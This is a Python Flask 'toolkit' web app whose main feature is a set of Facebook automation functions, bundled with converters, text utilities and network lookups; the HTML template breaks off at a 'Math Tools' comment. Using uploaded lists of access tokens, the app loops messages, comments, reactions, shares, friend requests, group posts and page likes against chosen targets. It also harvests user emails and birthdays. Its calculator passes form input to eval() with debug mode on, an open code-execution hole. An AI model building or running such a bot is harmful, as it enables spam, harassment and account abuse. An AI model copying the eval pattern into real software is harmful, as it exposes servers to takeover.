from flask import Flask, request, render_template_string, jsonify, send_file
import requests
from threading import Thread, Event
import time
import random
import string
import json
import os
from datetime import datetime
import base64
import hashlib
import re
from io import BytesIO

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
}

stop_events = {}
threads = {}
tasks = {}

# ========== FACEBOOK TOOLS ==========
def fb_send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                time.sleep(time_interval)

def fb_post_comments(access_tokens, post_id, messages, time_interval, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for msg in messages:
            if stop_event.is_set():
                break
            for token in access_tokens:
                url = f'https://graph.facebook.com/v15.0/{post_id}/comments'
                response = requests.post(url, data={'access_token': token, 'message': msg}, headers=headers)
                time.sleep(time_interval)

def fb_react_post(access_tokens, post_id, reaction_type, time_interval, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for token in access_tokens:
            if stop_event.is_set():
                break
            url = f'https://graph.facebook.com/v15.0/{post_id}/reactions'
            requests.post(url, data={'access_token': token, 'type': reaction_type}, headers=headers)
            time.sleep(time_interval)

def fb_share_post(access_tokens, post_id, time_interval, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for token in access_tokens:
            if stop_event.is_set():
                break
            url = f'https://graph.facebook.com/v15.0/{post_id}/sharedposts'
            requests.post(url, data={'access_token': token}, headers=headers)
            time.sleep(time_interval)

def fb_friend_request(access_tokens, user_ids, time_interval, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for uid in user_ids:
            if stop_event.is_set():
                break
            for token in access_tokens:
                url = f'https://graph.facebook.com/v15.0/{uid}/friends'
                requests.post(url, data={'access_token': token}, headers=headers)
                time.sleep(time_interval)

def fb_group_post(access_tokens, group_id, messages, time_interval, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for msg in messages:
            if stop_event.is_set():
                break
            for token in access_tokens:
                url = f'https://graph.facebook.com/v15.0/{group_id}/feed'
                requests.post(url, data={'access_token': token, 'message': msg}, headers=headers)
                time.sleep(time_interval)

def fb_page_like(access_tokens, page_ids, time_interval, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for pid in page_ids:
            if stop_event.is_set():
                break
            for token in access_tokens:
                url = f'https://graph.facebook.com/v15.0/{pid}/likes'
                requests.post(url, data={'access_token': token}, headers=headers)
                time.sleep(time_interval)

def fb_get_user_info(access_token, user_id):
    url = f'https://graph.facebook.com/v15.0/{user_id}'
    params = {'access_token': access_token, 'fields': 'id,name,email,birthday,gender'}
    response = requests.get(url, params=params, headers=headers)
    return response.json() if response.status_code == 200 else {'error': 'Invalid token'}

def fb_token_checker(access_token):
    url = 'https://graph.facebook.com/v15.0/me'
    params = {'access_token': access_token}
    response = requests.get(url, params=params, headers=headers)
    return response.json() if response.status_code == 200 else {'error': 'Token expired'}

def fb_create_post(access_token, message, privacy='EVERYONE'):
    url = 'https://graph.facebook.com/v15.0/me/feed'
    data = {'access_token': access_token, 'message': message, 'privacy': json.dumps({'value': privacy})}
    response = requests.post(url, data=data, headers=headers)
    return response.json()

def fb_get_friends(access_token):
    url = 'https://graph.facebook.com/v15.0/me/friends'
    params = {'access_token': access_token}
    response = requests.get(url, params=params, headers=headers)
    return response.json()

def fb_get_groups(access_token):
    url = 'https://graph.facebook.com/v15.0/me/groups'
    params = {'access_token': access_token}
    response = requests.get(url, params=params, headers=headers)
    return response.json()

def fb_get_pages(access_token):
    url = 'https://graph.facebook.com/v15.0/me/accounts'
    params = {'access_token': access_token}
    response = requests.get(url, params=params, headers=headers)
    return response.json()

def fb_get_photos(access_token):
    url = 'https://graph.facebook.com/v15.0/me/photos'
    params = {'access_token': access_token}
    response = requests.get(url, params=params, headers=headers)
    return response.json()

# ========== UTILITY TOOLS ==========
def generate_password(length=12):
    chars = string.ascii_letters + string.digits + '!@#$%^&*'
    return ''.join(random.choice(chars) for _ in range(length))

def hash_text(text, algo='md5'):
    if algo == 'md5':
        return hashlib.md5(text.encode()).hexdigest()
    elif algo == 'sha256':
        return hashlib.sha256(text.encode()).hexdigest()
    elif algo == 'sha512':
        return hashlib.sha512(text.encode()).hexdigest()
    return ''

def encode_base64(text):
    return base64.b64encode(text.encode()).decode()

def decode_base64(text):
    try:
        return base64.b64decode(text.encode()).decode()
    except:
        return 'Invalid Base64'

def url_encode(text):
    return requests.utils.quote(text)

def url_decode(text):
    return requests.utils.unquote(text)

def generate_uuid():
    import uuid
    return str(uuid.uuid4())

def word_counter(text):
    words = text.split()
    return {'words': len(words), 'chars': len(text), 'lines': len(text.splitlines())}

def text_to_binary(text):
    return ' '.join(format(ord(c), '08b') for c in text)

def binary_to_text(binary):
    try:
        return ''.join(chr(int(b, 2)) for b in binary.split())
    except:
        return 'Invalid Binary'

def json_formatter(text):
    try:
        return json.dumps(json.loads(text), indent=2)
    except:
        return 'Invalid JSON'

def extract_emails(text):
    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)
    return '\n'.join(emails) if emails else 'No emails found'

def extract_urls(text):
    urls = re.findall(r'https?://[^\s]+', text)
    return '\n'.join(urls) if urls else 'No URLs found'

def extract_numbers(text):
    numbers = re.findall(r'\d+', text)
    return '\n'.join(numbers) if numbers else 'No numbers found'

def reverse_text(text):
    return text[::-1]

def random_case(text):
    return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)

def rot13(text):
    return text.translate(str.maketrans(
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
    ))

def remove_duplicates(text):
    lines = text.splitlines()
    return '\n'.join(dict.fromkeys(lines))

def sort_lines(text, reverse=False):
    lines = text.splitlines()
    return '\n'.join(sorted(lines, reverse=reverse))

def add_line_numbers(text):
    return '\n'.join(f'{i+1}: {line}' for i, line in enumerate(text.splitlines()))

def merge_lines(text):
    return ' '.join(text.splitlines())

def text_stats(text):
    words = len(text.split())
    chars = len(text)
    lines = len(text.splitlines())
    sentences = len(re.findall(r'[.!?]+', text))
    return f'Words: {words}\nChars: {chars}\nLines: {lines}\nSentences: {sentences}'

def password_strength(password):
    score = 0
    if len(password) >= 8: score += 1
    if len(password) >= 12: score += 1
    if re.search(r'[A-Z]', password): score += 1
    if re.search(r'[a-z]', password): score += 1
    if re.search(r'\d', password): score += 1
    if re.search(r'[!@#$%^&*]', password): score += 1
    levels = ['Very Weak', 'Weak', 'Fair', 'Good', 'Strong', 'Very Strong']
    return f'{levels[score]} (Score: {score}/6)'

def generate_lorem():
    return 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris.'

def generate_random_name():
    first = ['John', 'Jane', 'Mike', 'Sarah', 'David', 'Emma', 'Chris', 'Lisa', 'Tom', 'Anna']
    last = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis']
    return f'{random.choice(first)} {random.choice(last)}'

def generate_random_email():
    names = ['john', 'jane', 'mike', 'sarah', 'david']
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
    return f'{random.choice(names)}{random.randint(1,999)}@{random.choice(domains)}'

def generate_random_phone():
    return f'({random.randint(100,999)}) {random.randint(100,999)}-{random.randint(1000,9999)}'

def generate_random_address():
    streets = ['Main St', 'Oak Ave', 'Pine Blvd', 'Maple Rd', 'Cedar Ln']
    cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix']
    return f'{random.randint(1,9999)} {random.choice(streets)}, {random.choice(cities)}'

def generate_random_color():
    return f'#{random.randint(0,16777215):06x}'

def generate_random_number(min_val=1, max_val=100):
    return random.randint(min_val, max_val)

def calculate_age(birth_date):
    try:
        birth = datetime.strptime(birth_date, '%Y-%m-%d')
        today = datetime.now()
        age = today.year - birth.year - ((today.month, today.day) < (birth.month, birth.day))
        return f'{age} years'
    except:
        return 'Invalid date format (YYYY-MM-DD)'

def days_between(date1, date2):
    try:
        d1 = datetime.strptime(date1, '%Y-%m-%d')
        d2 = datetime.strptime(date2, '%Y-%m-%d')
        return abs((d2 - d1).days)
    except:
        return 'Invalid date format'

def timestamp_to_date(timestamp):
    try:
        return datetime.fromtimestamp(int(timestamp)).strftime('%Y-%m-%d %H:%M:%S')
    except:
        return 'Invalid timestamp'

def current_timestamp():
    return str(int(time.time()))

def convert_kg_lbs(value, to='lbs'):
    try:
        v = float(value)
        return f'{v * 2.20462:.2f} lbs' if to == 'lbs' else f'{v / 2.20462:.2f} kg'
    except:
        return 'Invalid number'

def convert_cm_inch(value, to='inch'):
    try:
        v = float(value)
        return f'{v / 2.54:.2f} inch' if to == 'inch' else f'{v * 2.54:.2f} cm'
    except:
        return 'Invalid number'

def convert_c_f(value, to='f'):
    try:
        v = float(value)
        return f'{(v * 9/5) + 32:.2f}°F' if to == 'f' else f'{(v - 32) * 5/9:.2f}°C'
    except:
        return 'Invalid number'

def convert_km_miles(value, to='miles'):
    try:
        v = float(value)
        return f'{v / 1.60934:.2f} miles' if to == 'miles' else f'{v * 1.60934:.2f} km'
    except:
        return 'Invalid number'

def calculator(expression):
    try:
        return eval(expression)
    except:
        return 'Invalid expression'

def square_root(value):
    try:
        import math
        return math.sqrt(float(value))
    except:
        return 'Invalid number'

def percentage(value, percent):
    try:
        return (float(value) * float(percent)) / 100
    except:
        return 'Invalid numbers'

def get_ip_info(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}')
        return json.dumps(response.json(), indent=2)
    except:
        return 'Error fetching IP info'

def url_shortener(url):
    try:
        response = requests.get(f'https://is.gd/create.php?format=simple&url={url}')
        return response.text
    except:
        return 'Error shortening URL'

def qr_generator(text):
    try:
        import qrcode
        img = qrcode.make(text)
        buf = BytesIO()
        img.save(buf, format='PNG')
        return base64.b64encode(buf.getvalue()).decode()
    except:
        return ''

def ping_website(url):
    try:
        start = time.time()
        response = requests.get(url if url.startswith('http') else f'https://{url}', timeout=5)
        latency = (time.time() - start) * 1000
        return f'Status: {response.status_code}\nLatency: {latency:.2f}ms'
    except:
        return 'Website unreachable'

def dns_lookup(domain):
    try:
        import socket
        return socket.gethostbyname(domain)
    except:
        return 'DNS lookup failed'

def whois_lookup(domain):
    try:
        response = requests.get(f'https://api.hackertarget.com/whois/?q={domain}')
        return response.text
    except:
        return 'WHOIS lookup failed'

def http_headers_check(url):
    try:
        response = requests.get(url if url.startswith('http') else f'https://{url}', timeout=5)
        return json.dumps(dict(response.headers), indent=2)
    except:
        return 'Error fetching headers'

def ssl_checker(domain):
    try:
        import ssl
        import socket
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.connect((domain, 443))
            cert = s.getpeercert()
            return json.dumps(cert, indent=2, default=str)
    except:
        return 'SSL check failed'

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        tool = request.form.get('tool')
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        # Token handling
        token_option = request.form.get('tokenOption', 'single')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken', '')]
        else:
            token_file = request.files.get('tokenFile')
            access_tokens = token_file.read().decode().strip().splitlines() if token_file else []
        
        # Handle different tools
        if tool == 'send_message':
            thread_id = request.form.get('threadId')
            mn = request.form.get('kidx')
            time_interval = int(request.form.get('time', 1))
            txt_file = request.files.get('txtFile')
            messages = txt_file.read().decode().splitlines() if txt_file else []
            stop_events[task_id] = Event()
            thread = Thread(target=fb_send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
            threads[task_id] = thread
            thread.start()
            return f'✅ Task started! ID: {task_id}'
        
        elif tool == 'post_comments':
            post_id = request.form.get('postId')
            time_interval = int(request.form.get('time', 2))
            txt_file = request.files.get('txtFile')
            messages = txt_file.read().decode().splitlines() if txt_file else []
            stop_events[task_id] = Event()
            thread = Thread(target=fb_post_comments, args=(access_tokens, post_id, messages, time_interval, task_id))
            threads[task_id] = thread
            thread.start()
            return f'✅ Comment task started! ID: {task_id}'
        
        elif tool == 'react_post':
            post_id = request.form.get('postId')
            reaction = request.form.get('reaction', 'LIKE')
            time_interval = int(request.form.get('time', 1))
            stop_events[task_id] = Event()
            thread = Thread(target=fb_react_post, args=(access_tokens, post_id, reaction, time_interval, task_id))
            threads[task_id] = thread
            thread.start()
            return f'✅ Reaction task started! ID: {task_id}'
        
        elif tool == 'token_checker':
            result = fb_token_checker(access_tokens[0])
            return jsonify(result)
        
        elif tool == 'get_user_info':
            user_id = request.form.get('userId')
            result = fb_get_user_info(access_tokens[0], user_id)
            return jsonify(result)
        
        elif tool == 'create_post':
            message = request.form.get('message')
            result = fb_create_post(access_tokens[0], message)
            return jsonify(result)
        
        elif tool == 'get_friends':
            result = fb_get_friends(access_tokens[0])
            return jsonify(result)
        
        elif tool == 'get_groups':
            result = fb_get_groups(access_tokens[0])
            return jsonify(result)
        
        elif tool == 'hash_generator':
            text = request.form.get('text', '')
            algo = request.form.get('algo', 'md5')
            return hash_text(text, algo)
        
        elif tool == 'base64_encode':
            text = request.form.get('text', '')
            return encode_base64(text)
        
        elif tool == 'base64_decode':
            text = request.form.get('text', '')
            return decode_base64(text)
        
        elif tool == 'password_generator':
            length = int(request.form.get('length', 12))
            return generate_password(length)
        
        elif tool == 'word_counter':
            text = request.form.get('text', '')
            result = word_counter(text)
            return jsonify(result)
        
        elif tool == 'text_to_binary':
            text = request.form.get('text', '')
            return text_to_binary(text)
        
        elif tool == 'binary_to_text':
            text = request.form.get('text', '')
            return binary_to_text(text)
        
        elif tool == 'json_formatter':
            text = request.form.get('text', '')
            return json_formatter(text)
        
        elif tool == 'extract_emails':
            text = request.form.get('text', '')
            return extract_emails(text)
        
        elif tool == 'extract_urls':
            text = request.form.get('text', '')
            return extract_urls(text)
        
        elif tool == 'reverse_text':
            text = request.form.get('text', '')
            return reverse_text(text)
        
        elif tool == 'password_strength':
            text = request.form.get('text', '')
            return password_strength(text)
        
        elif tool == 'generate_lorem':
            return generate_lorem()
        
        elif tool == 'random_name':
            return generate_random_name()
        
        elif tool == 'random_email':
            return generate_random_email()
        
        elif tool == 'random_phone':
            return generate_random_phone()
        
        elif tool == 'random_color':
            return generate_random_color()
        
        elif tool == 'calculate_age':
            date = request.form.get('date', '')
            return calculate_age(date)
        
        elif tool == 'timestamp_now':
            return current_timestamp()
        
        elif tool == 'calculator':
            expr = request.form.get('expression', '')
            return str(calculator(expr))
        
        elif tool == 'ip_info':
            ip = request.form.get('ip', '')
            return get_ip_info(ip)
        
        elif tool == 'url_shorten':
            url = request.form.get('url', '')
            return url_shortener(url)
        
        elif tool == 'ping_website':
            url = request.form.get('url', '')
            return ping_website(url)
        
        elif tool == 'dns_lookup':
            domain = request.form.get('domain', '')
            return dns_lookup(domain)
        
        elif tool == 'whois':
            domain = request.form.get('domain', '')
            return whois_lookup(domain)
        
        elif tool == 'http_headers':
            url = request.form.get('url', '')
            return http_headers_check(url)
        
        elif tool == 'convert_kg_lbs':
            value = request.form.get('value', '')
            to = request.form.get('to', 'lbs')
            return convert_kg_lbs(value, to)
        
        elif tool == 'convert_c_f':
            value = request.form.get('value', '')
            to = request.form.get('to', 'f')
            return convert_c_f(value, to)
        
        elif tool == 'convert_km_miles':
            value = request.form.get('value', '')
            to = request.form.get('to', 'miles')
            return convert_km_miles(value, to)
        
        elif tool == 'uuid_generator':
            return generate_uuid()
        
        elif tool == 'sort_lines':
            text = request.form.get('text', '')
            reverse = request.form.get('reverse') == 'true'
            return sort_lines(text, reverse)
        
        elif tool == 'remove_duplicates':
            text = request.form.get('text', '')
            return remove_duplicates(text)
        
        elif tool == 'rot13':
            text = request.form.get('text', '')
            return rot13(text)
        
        return 'Tool executed successfully!'
    
    return render_template_string(HTML_TEMPLATE)

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'✅ Task {task_id} stopped!'
    return f'❌ No task found: {task_id}'

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>⚡ 100+ TOOLKIT | PRO SUITE</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: white;
      font-family: 'Segoe UI', sans-serif;
      padding: 20px;
    }
    .header {
      text-align: center;
      padding: 30px 20px;
      background: rgba(0,0,0,0.3);
      border-radius: 20px;
      margin-bottom: 30px;
      border: 1px solid rgba(255,255,255,0.1);
    }
    .header h1 {
      background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      font-weight: 800;
      font-size: 2.5rem;
    }
    .tool-section {
      background: rgba(255,255,255,0.05);
      border-radius: 20px;
      padding: 25px;
      margin-bottom: 25px;
      border: 1px solid rgba(255,255,255,0.1);
      backdrop-filter: blur(10px);
    }
    .section-title {
      color: #4ecdc4;
      margin-bottom: 20px;
      font-weight: 600;
      border-bottom: 2px solid #4ecdc4;
      padding-bottom: 10px;
    }
    .tool-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
      gap: 15px;
    }
    .tool-card {
      background: rgba(0,0,0,0.3);
      border-radius: 15px;
      padding: 20px;
      cursor: pointer;
      transition: all 0.3s;
      border: 1px solid rgba(255,255,255,0.05);
    }
    .tool-card:hover {
      transform: translateY(-5px);
      background: rgba(78, 205, 196, 0.1);
      border-color: #4ecdc4;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    }
    .tool-card i {
      font-size: 2rem;
      color: #4ecdc4;
      margin-bottom: 10px;
    }
    .tool-card h4 {
      font-size: 1.1rem;
      margin-bottom: 5px;
    }
    .tool-card p {
      font-size: 0.85rem;
      opacity: 0.7;
      margin: 0;
    }
    .modal-content {
      background: linear-gradient(135deg, #1e1e2f, #2d2d4a);
      color: white;
      border: 1px solid #4ecdc4;
    }
    .form-control, .form-select {
      background: rgba(0,0,0,0.3);
      border: 1px solid rgba(255,255,255,0.1);
      color: white;
    }
    .form-control:focus {
      background: rgba(0,0,0,0.5);
      border-color: #4ecdc4;
      color: white;
    }
    .btn-primary {
      background: linear-gradient(45deg, #4ecdc4, #45b7d1);
      border: none;
      font-weight: 600;
    }
    .btn-danger {
      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
      border: none;
    }
    .result-box {
      background: rgba(0,0,0,0.3);
      border-radius: 10px;
      padding: 15px;
      margin-top: 15px;
      border: 1px solid #4ecdc4;
      max-height: 300px;
      overflow: auto;
    }
    .badge-pro {
      background: linear-gradient(45deg, #ff6b6b, #ee5a24);
      font-size: 0.7rem;
      padding: 3px 8px;
      border-radius: 20px;
      margin-left: 5px;
    }
  </style>
</head>
<body>
  <div class="container-fluid">
    <div class="header">
      <h1><i class="fas fa-toolbox"></i> 100+ TOOLKIT PRO <span class="badge-pro">PREMIUM</span></h1>
      <p class="mb-0">Facebook Tools • Crypto • Converters • Generators • Network • Text Tools</p>
    </div>

    <!-- Task Control -->
    <div class="tool-section">
      <h3 class="section-title"><i class="fas fa-tasks"></i> Task Control</h3>
      <div class="row">
        <div class="col-md-6">
          <form method="post" action="/stop">
            <label>Stop Running Task</label>
            <div class="input-group">
              <input type="text" class="form-control" name="taskId" placeholder="Enter Task ID" required>
              <button type="submit" class="btn btn-danger"><i class="fas fa-stop"></i> Stop</button>
            </div>
          </form>
        </div>
      </div>
    </div>

    <!-- Facebook Tools -->
    <div class="tool-section">
      <h3 class="section-title"><i class="fab fa-facebook"></i> Facebook Tools (15+)</h3>
      <div class="tool-grid">
        <div class="tool-card" onclick="showTool('send_message')">
          <i class="fas fa-comment-dots"></i>
          <h4>Message Sender</h4>
          <p>Auto send messages to inbox</p>
        </div>
        <div class="tool-card" onclick="showTool('post_comments')">
          <i class="fas fa-comments"></i>
          <h4>Auto Commenter</h4>
          <p>Post comments automatically</p>
        </div>
        <div class="tool-card" onclick="showTool('react_post')">
          <i class="fas fa-thumbs-up"></i>
          <h4>Auto React</h4>
          <p>Auto react on posts</p>
        </div>
        <div class="tool-card" onclick="showTool('token_checker')">
          <i class="fas fa-key"></i>
          <h4>Token Checker</h4>
          <p>Check if token is valid</p>
        </div>
        <div class="tool-card" onclick="showTool('get_user_info')">
          <i class="fas fa-user"></i>
          <h4>User Info</h4>
          <p>Get Facebook user details</p>
        </div>
        <div class="tool-card" onclick="showTool('create_post')">
          <i class="fas fa-plus-square"></i>
          <h4>Create Post</h4>
          <p>Post on your timeline</p>
        </div>
        <div class="tool-card" onclick="showTool('get_friends')">
          <i class="fas fa-users"></i>
          <h4>Friends List</h4>
          <p>Get your friends list</p>
        </div>
        <div class="tool-card" onclick="showTool('get_groups')">
          <i class="fas fa-user-friends"></i>
          <h4>Groups List</h4>
          <p>Get your groups</p>
        </div>
        <div class="tool-card" onclick="showTool('share_post')">
          <i class="fas fa-share"></i>
          <h4>Share Post</h4>
          <p>Auto share posts</p>
        </div>
        <div class="tool-card" onclick="showTool('friend_request')">
          <i class="fas fa-user-plus"></i>
          <h4>Friend Request</h4>
          <p>Send friend requests</p>
        </div>
        <div class="tool-card" onclick="showTool('group_post')">
          <i class="fas fa-users-cog"></i>
          <h4>Group Poster</h4>
          <p>Post in groups</p>
        </div>
        <div class="tool-card" onclick="showTool('page_like')">
          <i class="fas fa-heart"></i>
          <h4>Page Liker</h4>
          <p>Auto like pages</p>
        </div>
      </div>
    </div>

    <!-- Crypto & Hash Tools -->
    <div class="tool-section">
      <h3 class="section-title"><i class="fas fa-lock"></i> Crypto & Hash Tools</h3>
      <div class="tool-grid">
        <div class="tool-card" onclick="showTool('hash_generator')">
          <i class="fas fa-hashtag"></i>
          <h4>Hash Generator</h4>
          <p>MD5, SHA256, SHA512</p>
        </div>
        <div class="tool-card" onclick="showTool('base64_encode')">
          <i class="fas fa-code"></i>
          <h4>Base64 Encode</h4>
          <p>Encode text to Base64</p>
        </div>
        <div class="tool-card" onclick="showTool('base64_decode')">
          <i class="fas fa-unlock"></i>
          <h4>Base64 Decode</h4>
          <p>Decode Base64 to text</p>
        </div>
        <div class="tool-card" onclick="showTool('password_generator')">
          <i class="fas fa-dice"></i>
          <h4>Password Generator</h4>
          <p>Generate strong passwords</p>
        </div>
        <div class="tool-card" onclick="showTool('password_strength')">
          <i class="fas fa-shield-alt"></i>
          <h4>Password Strength</h4>
          <p>Check password security</p>
        </div>
        <div class="tool-card" onclick="showTool('uuid_generator')">
          <i class="fas fa-fingerprint"></i>
          <h4>UUID Generator</h4>
          <p>Generate unique IDs</p>
        </div>
        <div class="tool-card" onclick="showTool('rot13')">
          <i class="fas fa-eye-slash"></i>
          <h4>ROT13 Cipher</h4>
          <p>Encode/decode ROT13</p>
        </div>
      </div>
    </div>

    <!-- Text Tools -->
    <div class="tool-section">
      <h3 class="section-title"><i class="fas fa-align-left"></i> Text Tools</h3>
      <div class="tool-grid">
        <div class="tool-card" onclick="showTool('word_counter')">
          <i class="fas fa-i-cursor"></i>
          <h4>Word Counter</h4>
          <p>Count words & characters</p>
        </div>
        <div class="tool-card" onclick="showTool('text_to_binary')">
          <i class="fas fa-microchip"></i>
          <h4>Text to Binary</h4>
          <p>Convert text to binary</p>
        </div>
        <div class="tool-card" onclick="showTool('binary_to_text')">
          <i class="fas fa-undo-alt"></i>
          <h4>Binary to Text</h4>
          <p>Convert binary to text</p>
        </div>
        <div class="tool-card" onclick="showTool('json_formatter')">
          <i class="fas fa-brackets-curly"></i>
          <h4>JSON Formatter</h4>
          <p>Prettify JSON data</p>
        </div>
        <div class="tool-card" onclick="showTool('extract_emails')">
          <i class="fas fa-envelope"></i>
          <h4>Extract Emails</h4>
          <p>Find emails in text</p>
        </div>
        <div class="tool-card" onclick="showTool('extract_urls')">
          <i class="fas fa-link"></i>
          <h4>Extract URLs</h4>
          <p>Find URLs in text</p>
        </div>
        <div class="tool-card" onclick="showTool('reverse_text')">
          <i class="fas fa-exchange-alt"></i>
          <h4>Reverse Text</h4>
          <p>Reverse your text</p>
        </div>
        <div class="tool-card" onclick="showTool('sort_lines')">
          <i class="fas fa-sort-alpha-down"></i>
          <h4>Sort Lines</h4>
          <p>Sort text lines A-Z</p>
        </div>
        <div class="tool-card" onclick="showTool('remove_duplicates')">
          <i class="fas fa-filter"></i>
          <h4>Remove Duplicates</h4>
          <p>Remove duplicate lines</p>
        </div>
        <div class="tool-card" onclick="showTool('generate_lorem')">
          <i class="fas fa-paragraph"></i>
          <h4>Lorem Ipsum</h4>
          <p>Generate placeholder text</p>
        </div>
      </div>
    </div>

    <!-- Generators -->
    <div class="tool-section">
      <h3 class="section-title"><i class="fas fa-magic"></i> Generators</h3>
      <div class="tool-grid">
        <div class="tool-card" onclick="showTool('random_name')">
          <i class="fas fa-user-tag"></i>
          <h4>Random Name</h4>
          <p>Generate random names</p>
        </div>
        <div class="tool-card" onclick="showTool('random_email')">
          <i class="fas fa-at"></i>
          <h4>Random Email</h4>
          <p>Generate fake emails</p>
        </div>
        <div class="tool-card" onclick="showTool('random_phone')">
          <i class="fas fa-phone"></i>
          <h4>Random Phone</h4>
          <p>Generate fake numbers</p>
        </div>
        <div class="tool-card" onclick="showTool('random_color')">
          <i class="fas fa-palette"></i>
          <h4>Random Color</h4>
          <p>Generate hex colors</p>
        </div>
        <div class="tool-card" onclick="showTool('random_number')">
          <i class="fas fa-dice-d6"></i>
          <h4>Random Number</h4>
          <p>Generate random numbers</p>
        </div>
        <div class="tool-card" onclick="showTool('random_address')">
          <i class="fas fa-map-marker-alt"></i>
          <h4>Random Address</h4>
          <p>Generate fake addresses</p>
        </div>
      </div>
    </div>

    <!-- Converters -->
    <div class="tool-section">
      <h3 class="section-title"><i class="fas fa-exchange-alt"></i> Unit Converters</h3>
      <div class="tool-grid">
        <div class="tool-card" onclick="showTool('convert_kg_lbs')">
          <i class="fas fa-weight-scale"></i>
          <h4>kg ⇄ lbs</h4>
          <p>Weight converter</p>
        </div>
        <div class="tool-card" onclick="showTool('convert_cm_inch')">
          <i class="fas fa-ruler"></i>
          <h4>cm ⇄ inch</h4>
          <p>Length converter</p>
        </div>
        <div class="tool-card" onclick="showTool('convert_c_f')">
          <i class="fas fa-thermometer-half"></i>
          <h4>°C ⇄ °F</h4>
          <p>Temperature converter</p>
        </div>
        <div class="tool-card" onclick="showTool('convert_km_miles')">
          <i class="fas fa-road"></i>
          <h4>km ⇄ miles</h4>
          <p>Distance converter</p>
        </div>
        <div class="tool-card" onclick="showTool('timestamp_to_date')">
          <i class="fas fa-calendar"></i>
          <h4>Timestamp → Date</h4>
          <p>Convert Unix timestamp</p>
        </div>
        <div class="tool-card" onclick="showTool('timestamp_now')">
          <i class="fas fa-clock"></i>
          <h4>Current Timestamp</h4>
          <p>Get Unix timestamp</p>
        </div>
        <div class="tool-card" onclick="showTool('calculate_age')">
          <i class="fas fa-birthday-cake"></i>
          <h4>Age Calculator</h4>
          <p>Calculate exact age</p>
        </div>
        <div class="tool-card" onclick="showTool('days_between')">
          <i class="fas fa-calendar-alt"></i>
          <h4>Days Between</h4>
          <p>Days between dates</p>
        </div>
      </div>
    </div>

     <!-- Network Tools -->
    <div class="tool-section">
      <h3 class="section-title"><i class="fas fa-globe"></i> Network Tools</h3>
      <div class="tool-grid">
        <div class="tool-card" onclick="showTool('ip_info')">
          <i class="fas fa-map-pin"></i>
          <h4>IP Info Lookup</h4>
          <p>Get IP geolocation</p>
        </div>
        <div class="tool-card" onclick="showTool('ping_website')">
          <i class="fas fa-satellite-dish"></i>
          <h4>Ping Website</h4>
          <p>Check website status</p>
        </div>
        <div class="tool-card" onclick="showTool('dns_lookup')">
          <i class="fas fa-server"></i>
          <h4>DNS Lookup</h4>
          <p>Get domain IP address</p>
        </div>
        <div class="tool-card" onclick="showTool('whois')">
          <i class="fas fa-info-circle"></i>
          <h4>WHOIS Lookup</h4>
          <p>Domain information</p>
        </div>
        <div class="tool-card" onclick="showTool('http_headers')">
          <i class="fas fa-code-branch"></i>
          <h4>HTTP Headers</h4>
          <p>Check response headers</p>
        </div>
        <div class="tool-card" onclick="showTool('url_shorten')">
          <i class="fas fa-compress"></i>
          <h4>URL Shortener</h4>
          <p>Shorten long URLs</p>
        </div>
        <div class="tool-card" onclick="showTool('ssl_checker')">
          <i class="fas fa-lock"></i>
          <h4>SSL Checker</h4>
          <p>Check SSL certificate</p>
        </div>
      </div>
    </div>

    <!-- Math Tools -->
